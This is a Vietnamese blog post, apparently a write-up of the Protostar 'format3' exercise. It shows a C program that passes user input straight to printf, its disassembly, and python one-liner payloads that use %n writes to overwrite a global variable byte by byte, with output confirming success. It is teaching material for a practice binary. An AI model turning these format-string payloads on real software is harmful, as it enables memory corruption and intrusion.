---
layout: post
title: format3
---

Trong bài này, chúng ta sẽ tiếp tục dùng `printf` với `%n` một cách linh hoạt hơn.
Thay vì chỉ ghi một giá 4 byte, chúng ta có thể dùng `printf` để ghi từng thành phần byte

Sau đây là source code và asm code của chương trình format3.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```
```asm
0x08048454 <printbuffer+0>:     push   ebp
0x08048455 <printbuffer+1>:     mov    ebp,esp
0x08048457 <printbuffer+3>:     sub    esp,0x18
0x0804845a <printbuffer+6>:     mov    eax,DWORD PTR [ebp+0x8]
0x0804845d <printbuffer+9>:     mov    DWORD PTR [esp],eax
0x08048460 <printbuffer+12>:    call   0x804837c <printf@plt>
0x08048465 <printbuffer+17>:    leave
0x08048466 <printbuffer+18>:    ret
0x08048467 <vuln+0>:    push   ebp
0x08048468 <vuln+1>:    mov    ebp,esp
0x0804846a <vuln+3>:    sub    esp,0x218
0x08048470 <vuln+9>:    mov    eax,ds:0x80496e8
0x08048475 <vuln+14>:   mov    DWORD PTR [esp+0x8],eax
0x08048479 <vuln+18>:   mov    DWORD PTR [esp+0x4],0x200
0x08048481 <vuln+26>:   lea    eax,[ebp-0x208]
0x08048487 <vuln+32>:   mov    DWORD PTR [esp],eax
0x0804848a <vuln+35>:   call   0x804835c <fgets@plt>
0x0804848f <vuln+40>:   lea    eax,[ebp-0x208]
0x08048495 <vuln+46>:   mov    DWORD PTR [esp],eax
0x08048498 <vuln+49>:   call   0x8048454 <printbuffer>
0x0804849d <vuln+54>:   mov    eax,ds:0x80496f4
0x080484a2 <vuln+59>:   cmp    eax,0x1025544
0x080484a7 <vuln+64>:   jne    0x80484b7 <vuln+80>
0x080484a9 <vuln+66>:   mov    DWORD PTR [esp],0x80485a0
0x080484b0 <vuln+73>:   call   0x804838c <puts@plt>
0x080484b5 <vuln+78>:   jmp    0x80484ce <vuln+103>
0x080484b7 <vuln+80>:   mov    edx,DWORD PTR ds:0x80496f4
0x080484bd <vuln+86>:   mov    eax,0x80485c0
0x080484c2 <vuln+91>:   mov    DWORD PTR [esp+0x4],edx
0x080484c6 <vuln+95>:   mov    DWORD PTR [esp],eax
0x080484c9 <vuln+98>:   call   0x804837c <printf@plt>
0x080484ce <vuln+103>:  leave
0x080484cf <vuln+104>:  ret
0x080484d0 <main+0>:    push   ebp
0x080484d1 <main+1>:    mov    ebp,esp
0x080484d3 <main+3>:    and    esp,0xfffffff0
0x080484d6 <main+6>:    call   0x8048467 <vuln>
0x080484db <main+11>:   mov    esp,ebp
0x080484dd <main+13>:   pop    ebp
0x080484de <main+14>:   ret
```

Để tìm được địa chỉ của `target`, dùng objdump như 2 bài trước. Kết quả cho thấy `target` được lưu tại `0x080496f4`.
Tiếp theo ta tìm khoảng cách từ `esp` đến địa chỉ của formatted string cũng như bài trước. Kết quả cho thấy khoảng cách này là 44 byte, tương đương với tham số thứ 12 khi gọi hàm `printf`.
Giá trị cần ghi vào `target` là `0x01025544`.
Ta có thể làm tương tự như bài trước bằng cách xây dựng 4 byte địa chỉ, đi kèm với in ra 16,930,112 ký tự với `%x` như sau.

```bash
python -c 'print "\xf4\x96\x04\x08" + "%16930112x" + "%12$n"'
```

Ta cũng có thể ghi từng byte thành phần như sau.
Đầu tiên, cần tách giá trị `0x01025544` thành:
* `0x01` lưu vào `0x080496f7`
* `0x02` lưu vào `0x080496f6`
* `0x55` lưu vào `0x080496f5`
* `0x44` lưu vào `0x080496f4`

Tuy nhiên, thứ tự lưu cần được lưu ý, vì mỗi lần lưu vào địa chỉ `0xY` thì 4 byte từ `0xY` đến `0xY + 3` sẽ bị thay đổi theo.
Ví dụ nếu ta lưu `0x01` vào `0x080496f7`, ta sẽ được giá trị của `target` như sau.
<pre class="memory">
0x080496f4:     0x<span style="color:orangered">01</span>000000
</pre>
Sau đó, ta lưu `0x02` vào `0x080496f6` thì giá trị tại `0x080496f7` sẽ mất đi (trở về `0x00` do ghi `0x02` tương đương với `0x0002`).
<pre class="memory">
0x080496f4:     0x00<span style="color:orangered">02</span>0000
</pre>

Lưu ý thứ 2 đó là chúng ta không thể giảm giá trị sẽ được lưu khi lệnh `printf` tiếp diễn.
Cụ thể, vì bản chất của `printf` kết hợp với `%n` là ghi số lượng ký tự đã được in ra màn hình, giá trị được lưu với `%n` chỉ tăng dần theo thời gian cho đến khi `printf` kết thúc.
Do vậy, đối với bài này, chúng ta có thể ghi theo trình tự như sau.
* `0x44` lưu vào `0x080496f4`
* `0x55` lưu vào `0x080496f5`
* `0x0102` lưu vào `0x080496f6`

Với cách ghi này, ta cần xây dựng formatted string có cả 3 địa chỉ trên.
Rất may, với 3 địa chỉ này ở đầu formatted string, chúng ta chỉ tiêu tốn 12 ký tự in ra, nhỏ hơn giá trị 68 (hay `0x44`) cho lần ghi đầu tiên.
Ta cần in ra thêm 56 ký tự khác với `%x`.
Formatted string mở đầu như sau.

```bash
python -c 'print "\xf4\x96\x04\x08" + "\xf5\x96\x04\x08" + "\xf6\x96\x04\x08" + "%56x" + "%12$n"'
```

Sau lần ghi đầu, chúng ta đã in ra 68 ký tự.
Ở lần ghi thứ 2, cần thêm 17 ký tự nữa để đạt đủ 85 (hay `0x55`) cho lần ghi thứ hai.
Và ở lần ghi thứ hai, chúng ta sẽ ghi vào địa chỉ ở tham số thứ 13.

```bash
python -c 'print "\xf4\x96\x04\x08" + "\xf5\x96\x04\x08" + "\xf6\x96\x04\x08" + "%56x" + "%12$n" + "%17x" + "%13$n"'
```

Tương tự, với lần ghi cuối, ta cần thêm 173 ký tự để đạt đủ 258 (hay `0x0102`).
Lần ghi cuối này sẽ ghi vào địa chỉ ở tham số thứ 14.

```bash
python -c 'print "\xf4\x96\x04\x08" + "\xf5\x96\x04\x08" + "\xf6\x96\x04\x08" + "%56x" + "%12$n" + "%17x" + "%13$n" + "%173x" + "%14$n"'
```

Chạy thử chương trình, ta được như sau.
```bash
format3 <<< $(python -c 'print "\xf4\x96\x04\x08" + "\xf5\x96\x04\x08" + "\xf6\x96\x04\x08" + "%56x" + "%12$n" + "%17x" + "%13$n" + "%173x" + "%14$n"')
```

Chúng ta sẽ dựng formatted string dựa trên địa chỉ này.
Thành phần sẽ gồm 4 byte địa chỉ ở đầu. Tiếp theo, ta cần ghi thêm lệnh in 60 byte nữa trước khi sử dụng `%n` để ghi vào `target`.
Chúng ta cũng cần biết khoảng cách từ `esp` đến địa chỉ của formatted string.
Cách làm tương tự như bài trước, đó là dùng formatted string có cờ dạng `AAAA` ở đầu và các chuỗi `%x.` để xác định vị trí cờ sau khi in ra.

```bash
python -c "print 'AAAA' + '%x.' * 100"
```
<pre class="memory">
                                                       0         bffff5b0                                                                                                                                                                     b7fd7ff4
<span style="color:aqua">you have modified the target :)</span>
</pre>

Mục tiêu hoàn thành!

## Ref
```bash
user@protostar:~$ format3 <<< $(python -c 'print "\xf4\x96\x04\x08" + "\xf5\x96\x04\x08" + "\xf6\x96\x04\x08" + "%56x" + "%12$n" + "%17x" + "%13$n" + "%173x" + "%14$n"')
                                                       0         bffff5b0                                                                                                                                                                     b7fd7ff4
you have modified the target :)
```
